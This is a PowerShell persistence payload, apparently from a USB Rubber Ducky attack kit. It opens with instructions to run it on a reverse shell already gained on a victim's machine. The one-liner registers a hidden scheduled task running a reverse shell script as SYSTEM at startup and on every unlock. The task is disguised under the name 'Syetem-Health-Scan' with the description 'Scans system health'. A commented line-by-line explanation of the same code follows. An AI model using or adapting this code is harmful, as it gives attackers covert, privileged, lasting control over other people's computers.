# ----------------------------
# PowerShell Scheduled Task Payload for Persistence
# Description: Creates a scheduled task that runs a reverse shell script (L.ps1)
# silently at system startup and whenever the machine is unlocked.
# Runs as SYSTEM with highest privileges.
# Run these following commands on the Reverse Shell that you gained by inserting the Rubber Ducky.
# ----------------------------

#Run this single line command on the reverse shell.
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "C:\Windows\System32\L.ps1"';$startupTrigger = New-ScheduledTaskTrigger -AtStartup;$stateChangeTriggerClass = Get-CimClass -Namespace ROOT\Microsoft\Windows\TaskScheduler -ClassName MSFT_TaskSessionStateChangeTrigger;$onUnlockTrigger = New-CimInstance -CimClass $stateChangeTriggerClass -Property @{ StateChange = 8 } -ClientOnly;$trigger = @($startupTrigger, $onUnlockTrigger);$principal = New-ScheduledTaskPrincipal -RunLevel Highest -UserID "NT AUTHORITY\SYSTEM";$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable;Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "Syetem-Health-Scan" -Description "Scans system health" -Settings $settings



#Code explanation Line By Line

<#
# Define the action to execute: launch PowerShell in hidden mode to run L.ps1
$action = New-ScheduledTaskAction `
    -Execute 'Powershell.exe' `
    -Argument '-NoProfile -WindowStyle Hidden -Command "C:\Windows\System32\L.ps1"'

# Create a trigger that fires when the system starts
$startupTrigger = New-ScheduledTaskTrigger -AtStartup

# Get the class definition needed to create a session state change trigger (e.g., unlock)
$stateChangeTriggerClass = Get-CimClass `
    -Namespace ROOT\Microsoft\Windows\TaskScheduler `
    -ClassName MSFT_TaskSessionStateChangeTrigger

# Create a trigger that fires when the user unlocks the system (StateChange = 8)
$onUnlockTrigger = New-CimInstance `
    -CimClass $stateChangeTriggerClass `
    -Property @{ StateChange = 8 } `
    -ClientOnly

# Combine both triggers into a single array
$trigger = @($startupTrigger, $onUnlockTrigger)

# Set the task to run as SYSTEM with the highest run level (elevated privileges)
$principal = New-ScheduledTaskPrincipal `
    -RunLevel Highest `
    -UserID "NT AUTHORITY\SYSTEM"

# Define task settings:
# - Allow execution on battery power
# - Don't stop if switching to battery
# - Only run when network is available
$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -RunOnlyIfNetworkAvailable

# Register the scheduled task with a disguised name and description
Register-ScheduledTask `
    -Action $action `
    -Trigger $trigger `
    -Principal $principal `
    -TaskName "Syetem-Health-Scan" `  # Note: "Syetem" is a typo likely used to evade attention
    -Description "Scans system health" `
    -Settings $settings
#>